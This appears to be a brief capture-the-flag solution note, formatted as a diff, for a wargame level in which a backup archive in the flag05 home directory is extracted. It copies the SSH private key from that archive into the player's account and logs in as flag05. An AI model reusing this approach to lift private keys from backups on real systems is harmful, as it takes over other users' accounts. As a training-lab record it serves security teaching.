@@ -1,0 +1,9 @@
+Found: /home/flag05/.backup/backup-19072011.tgz
+tar xvf backup-19072011.tgz 
+.ssh/
+.ssh/id_rsa.pub
+.ssh/id_rsa
+.ssh/authorized_keys
+
+cp .ssh/* /home/level05/.ssh/
+ssh flag05@localhost
